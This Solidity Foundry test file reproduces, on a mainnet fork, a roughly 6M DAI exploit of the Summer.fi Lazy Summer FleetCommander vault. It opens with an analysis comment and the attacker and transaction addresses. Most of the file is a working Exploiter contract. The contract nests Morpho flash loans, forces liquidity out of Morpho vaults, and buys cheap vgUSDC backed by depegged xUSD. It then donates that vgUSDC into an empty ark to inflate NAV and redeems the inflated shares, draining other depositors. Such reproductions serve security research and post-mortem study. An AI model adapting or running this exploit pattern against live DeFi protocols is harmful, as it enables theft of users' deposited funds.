// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";

// @KeyInfo - Total Lost : 6.02M DAI
// Attacker : 0x7bf716167b48cf527725722c6d79494b45b3bdca
// Attack Contract : 0x0514f827c129c16418a0933e03c99a6af982fc61
// Vulnerable Contract : 0x98c49e13bf99d7cad8069faa2a370933ec9ecf17 (Summer.fi / Lazy Summer FleetCommander)
// Attack Tx : https://etherscan.io/tx/0x0db528c44f23fc7fa4544684a2fab81096450a14aae8bc89f42cd0592d43da12

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x98c49e13bf99d7cad8069faa2a370933ec9ecf17#code

// @Analysis
// PoC : reproduces the in-transaction legs; the attack contract is executed at its
//       historical address so it inherits the vgUSDC it pre-positioned in a prior setup tx.
//
// FleetCommander NAV is the live sum of each Ark's totalAssets() with no manipulation
// guard. A FleetA ark (SiloManagedVault 0x61d70630, empty at fork) follows Silo vgUSDC,
// which counts depegged Stream USD (xUSD) collateral at par. The attacker mints vgUSDC far
// below its counted value (USDT -> xUSD on Uniswap V4, xUSD -> vgUSDC on Balancer V3),
// deposits a dominant position into FleetA, donates the cheap vgUSDC into the empty ark to
// inflate NAV, then redeems the inflated shares - draining the other LPs.

address constant ATTACKER = 0x7BF716167B48CF527725722C6d79494b45B3BDCa;
address constant ATTACK_CONTRACT = 0x0514F827C129C16418a0933E03C99A6AF982FC61;

address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
address constant XUSD = 0xE2Fc85BfB48C4cF147921fBE110cf92Ef9f26F94;
address constant VGUSDC = 0x8399C8Fc273bD165C346Af74A02e65f10e4FD78F;

address constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
address constant FLEET_A = 0x98C49e13bf99D7CAd8069faa2A370933EC9EcF17;
address constant FLEET_A_ARK = 0x61d7063041d83C8ca3E42c39181dFd14B3Bc76c2;
address constant V4PM = 0x000000000004444c5dc75cB358380D2e3dE08A90;
address constant PERMIT2 = 0x000000000022D473030F116dDEE9F6B43aC78BA3;
address constant BAL_ROUTER = 0xAE563E3f8219521950555F5962419C8919758Ea2;
address constant BAL_POOL = 0xaE255Db04BA78519f33871c557d8fd6bafDb83bD;
address constant CURVE_3POOL = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;

struct PoolKey {
    address currency0;
    address currency1;
    uint24 fee;
    int24 tickSpacing;
    address hooks;
}

struct SwapParams {
    bool zeroForOne;
    int256 amountSpecified;
    uint160 sqrtPriceLimitX96;
}

interface IERC20 {
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IMorpho {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IFleetCommander {
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
    function maxRedeem(address owner) external view returns (uint256);
}

interface IPoolManager {
    function unlock(bytes calldata data) external returns (bytes memory);
    function swap(PoolKey memory key, SwapParams memory params, bytes calldata hookData) external returns (int256);
    function sync(address currency) external;
    function settle() external payable returns (uint256);
    function take(address currency, address to, uint256 amount) external;
}

interface IPermit2 {
    function approve(address token, address spender, uint160 amount, uint48 expiration) external;
}

interface IBalancerRouter {
    function swapSingleTokenExactIn(
        address pool,
        address tokenIn,
        address tokenOut,
        uint256 exactAmountIn,
        uint256 minAmountOut,
        uint256 deadline,
        bool wethIsEth,
        bytes calldata userData
    ) external payable returns (uint256);
}

interface ICurve {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
}

interface IVaultV2 {
    function deposit(uint256 assets, address receiver) external returns (uint256);
    function maxDeposit(address owner) external view returns (uint256);
    function forceDeallocate(address adapter, bytes memory data, uint256 assets, address onBehalf)
        external
        returns (uint256);
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        vm.createSelectFork("mainnet", 25_471_347);
        fundingToken = DAI;
        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "AttackContract");
        vm.label(FLEET_A, "FleetCommanderA");
        vm.label(FLEET_A_ARK, "SiloManagedVaultArk");
        vm.label(VGUSDC, "vgUSDC");
        vm.label(XUSD, "xUSD");
    }

    function testExploit() public {
        // execute at the historical attack contract so it inherits the vgUSDC it
        // pre-positioned in a prior setup tx (initial capital for this transaction)
        Exploiter impl = new Exploiter();
        vm.etch(ATTACK_CONTRACT, address(impl).code);

        uint256 before = IERC20(DAI).balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        Exploiter(ATTACK_CONTRACT).run(ATTACKER);
        uint256 profit = IERC20(DAI).balanceOf(ATTACKER) - before;

        emit log_named_decimal_uint("Attacker DAI profit", profit, 18);
        // The FleetA leg reproduced here extracts ~5.6M of the ~6.02M total loss; the
        // remaining ~0.4M came from a second FleetCommander (FleetB) leg not reproduced.
        assertGt(profit, 5_000_000e18, "profit below 5M DAI");
    }
}

contract Exploiter {
    uint256 constant FLASH_USDT = 1_000_000e6;
    uint256 constant FLASH_USDC = 65_419_171_879_990;
    uint256 constant XUSD_IN = 20_000e6; // USDT swapped for xUSD on Uniswap V4
    uint256 constant FLEET_A_DEPOSIT = 64_828_534_992_005;

    address internal profitReceiver;

    function _approve(address token, address spender, uint256 amount) internal {
        (bool ok,) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        require(ok, "approve");
    }

    function _xfer(address token, address to, uint256 amount) internal {
        (bool ok,) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
        require(ok, "transfer");
    }

    function run(address receiver) external {
        profitReceiver = receiver;
        _approve(USDT, MORPHO, type(uint256).max);
        // step 1: outer Morpho flash loan (USDT)
        IMorpho(MORPHO).flashLoan(USDT, FLASH_USDT, abi.encode(uint256(1)));

        // step 8: convert the USDC surplus to DAI and forward it to the attacker
        uint256 usdcLeft = IERC20(USDC).balanceOf(address(this));
        _approve(USDC, CURVE_3POOL, usdcLeft);
        ICurve(CURVE_3POOL).exchange(1, 0, usdcLeft, 0);
        _xfer(DAI, profitReceiver, IERC20(DAI).balanceOf(address(this)));
    }

    function onMorphoFlashLoan(uint256, bytes calldata data) external {
        uint256 phase = abi.decode(data, (uint256));
        if (phase == 1) {
            // step 2: inner Morpho flash loan (USDC) provides working capital
            _approve(USDC, MORPHO, type(uint256).max);
            IMorpho(MORPHO).flashLoan(USDC, FLASH_USDC, abi.encode(uint256(2)));
            // step 7: top the USDT back up (20k was swapped away) so the outer loan can be repaid
            uint256 shortfall = FLASH_USDT - IERC20(USDT).balanceOf(address(this));
            _approve(USDC, CURVE_3POOL, type(uint256).max);
            ICurve(CURVE_3POOL).exchange(1, 2, shortfall * 2, shortfall);
        } else {
            _exploit();
        }
    }

    // Morpho market: fixed loan token (USDC), IRM and LLTV; collateral/oracle vary per market.
    address constant MORPHO_IRM = 0x870aC11D48B15DB9a138Cf899d20F13F79Ba00BC;
    uint256 constant MORPHO_LLTV = 0x0bef55718ad60000; // 0.86e18

    function _forceFreeVault(address vault, address adapter, address collateral, address oracle, uint256 assets)
        internal
    {
        bytes memory marketParams = abi.encode(USDC, collateral, oracle, MORPHO_IRM, MORPHO_LLTV);
        // best-effort: a market may hold less than the trace amount in the reconstructed
        // state; freeing whatever the reachable markets allow still clears the redeem cap.
        try IVaultV2(vault).forceDeallocate(adapter, marketParams, assets, address(this)) {} catch {}
    }

    // step 3a: force liquidity out of the Morpho markets backing the FleetA VaultV2 arks so
    // the inflated redeem can be fully served (raises withdrawableTotalAssets by ~4.4M).
    function _freeArkLiquidity() internal {
        _approve(USDC, 0xe2221Aa07ec3266DA87763E2b1e28d07A8a4e53b, type(uint256).max);
        IVaultV2(0xe2221Aa07ec3266DA87763E2b1e28d07A8a4e53b).deposit(106_975_925, address(this));
        _forceFreeVault(0xe2221Aa07ec3266DA87763E2b1e28d07A8a4e53b, 0x9414a42Eab4580C042b18deF4d37372A7881e001, 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, 0x167D283aCAC1b9ff39466A75aA82902f340f1F4D, 165_917_376_977);
        _forceFreeVault(0xe2221Aa07ec3266DA87763E2b1e28d07A8a4e53b, 0x9414a42Eab4580C042b18deF4d37372A7881e001, 0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf, 0xc7BE7593FD5453Db5AdcC1d7103f2211d4F2e40D, 339_415_110_474);
        _forceFreeVault(0xe2221Aa07ec3266DA87763E2b1e28d07A8a4e53b, 0x9414a42Eab4580C042b18deF4d37372A7881e001, 0x73E0C0d45E048D25Fc26Fa3159b0aA04BfA4Db98, 0x5502a4cb797B6Db44275D1BbEA743463d256D554, 99_999_898_849);
        _forceFreeVault(0xe2221Aa07ec3266DA87763E2b1e28d07A8a4e53b, 0x9414a42Eab4580C042b18deF4d37372A7881e001, 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, 0x48F7E36EB6B826B2dF4B2E630B62Cd25e89E40e2, 464_426_763_683);

        _approve(USDC, 0xeBBaE8CfAbB0092d5B32f00EBeE0c8139d24dDcd, type(uint256).max);
        IVaultV2(0xeBBaE8CfAbB0092d5B32f00EBeE0c8139d24dDcd).deposit(182_326_261, address(this));
        _forceFreeVault(0xeBBaE8CfAbB0092d5B32f00EBeE0c8139d24dDcd, 0xfBE454F609C5F54cefe3F486129f05Dfa081Adf6, 0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf, 0xA6D6950c9F177F1De7f7757FB33539e3Ec60182a, 34_465_252_249);

        _approve(USDC, 0x4Ef53d2cAa51C447fdFEEedee8F07FD1962C9ee6, type(uint256).max);
        IVaultV2(0x4Ef53d2cAa51C447fdFEEedee8F07FD1962C9ee6).deposit(100_000_000, address(this));
        _forceFreeVault(0x4Ef53d2cAa51C447fdFEEedee8F07FD1962C9ee6, 0x1d511811ACA9d8817a3e50F29CadFf6243A02902, 0xae78736Cd615f374D3085123A210448E74Fc6393, 0x36Cb058364a811636685ef15a71E8ea99043f815, 372_425_946_459);
        _forceFreeVault(0x4Ef53d2cAa51C447fdFEEedee8F07FD1962C9ee6, 0x1d511811ACA9d8817a3e50F29CadFf6243A02902, 0x856c4Efb76C1D1AE02e20CEB03A2A6a08b0b8dC3, 0xE8aDfF9117151fb5ad7313873780b87cC56EEDB0, 789_709_312_788);
        _forceFreeVault(0x4Ef53d2cAa51C447fdFEEedee8F07FD1962C9ee6, 0x1d511811ACA9d8817a3e50F29CadFf6243A02902, 0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf, 0xA6D6950c9F177F1De7f7757FB33539e3Ec60182a, 1_868_812_232_296);

        _approve(USDC, 0x56bfa6f53669B836D1E0Dfa5e99706b12c373ecf, type(uint256).max);
        IVaultV2(0x56bfa6f53669B836D1E0Dfa5e99706b12c373ecf).deposit(576_726_804, address(this));
        _forceFreeVault(0x56bfa6f53669B836D1E0Dfa5e99706b12c373ecf, 0xCc0F95e65d2ce7fB715bfb418Bf61314d0878b41, 0x99CD4Ec3f88A45940936F469E4bB72A2A701EEB9, 0xba3D2Dc1670763c6729CC923A922C7513C0f9DD0, 283_363_402_402);
    }

    function _exploit() internal {
        _freeArkLiquidity();

        // step 3: mint cheap vgUSDC: USDT -> xUSD (Uniswap V4), xUSD -> vgUSDC (Balancer V3)
        uint256 xusd = _v4SwapUsdtToXusd(XUSD_IN);
        _approve(XUSD, PERMIT2, type(uint256).max);
        IPermit2(PERMIT2).approve(XUSD, BAL_ROUTER, uint160(xusd), uint48(block.timestamp + 3600));
        IBalancerRouter(BAL_ROUTER).swapSingleTokenExactIn(
            BAL_POOL, XUSD, VGUSDC, xusd, 0, block.timestamp + 3600, false, ""
        );

        // step 3b: route USDC into FleetA through the Strategy ark to add withdrawable
        // liquidity, so the later inflated redeem can be served in full. Bound the deposit
        // by the ark's dynamic maxDeposit so it never exceeds the current cap.
        address strategy = 0xA9ca4909700505585B1aD2a1579dA3b670FFA9c4;
        uint256 stratDeposit = 490_636_886_984;
        uint256 stratCap = IVaultV2(strategy).maxDeposit(address(this));
        if (stratDeposit > stratCap) stratDeposit = stratCap;
        _approve(USDC, strategy, stratDeposit);
        IVaultV2(strategy).deposit(stratDeposit, address(this));

        // step 4: take a dominant FleetA position at the honest NAV
        _approve(USDC, FLEET_A, FLEET_A_DEPOSIT);
        uint256 shares = IFleetCommander(FLEET_A).deposit(FLEET_A_DEPOSIT, address(this));

        // step 5: donate the cheap vgUSDC into the empty FleetA ark to inflate NAV
        _xfer(VGUSDC, FLEET_A_ARK, IERC20(VGUSDC).balanceOf(address(this)));

        // step 6: redeem the now-inflated shares (drains the other FleetA LPs)
        uint256 maxR = IFleetCommander(FLEET_A).maxRedeem(address(this));
        uint256 toRedeem = shares < maxR ? shares : maxR;
        IFleetCommander(FLEET_A).redeem(toRedeem, address(this), address(this));
    }

    function _v4SwapUsdtToXusd(uint256 amountIn) internal returns (uint256) {
        bytes memory ret = IPoolManager(V4PM).unlock(abi.encode(amountIn));
        return abi.decode(ret, (uint256));
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        uint256 amountIn = abi.decode(data, (uint256));
        PoolKey memory key = PoolKey(USDT, XUSD, 489_960, 9799, address(0));
        int256 delta = IPoolManager(V4PM).swap(key, SwapParams(true, -int256(amountIn), 4_295_128_740), "");
        uint256 out = uint256(uint128(int128(delta)));
        IPoolManager(V4PM).sync(USDT);
        (bool ok,) = USDT.call(abi.encodeWithSelector(IERC20.transfer.selector, V4PM, amountIn));
        require(ok, "usdt pay");
        IPoolManager(V4PM).settle();
        IPoolManager(V4PM).take(XUSD, address(this), out);
        return abi.encode(out);
    }
}
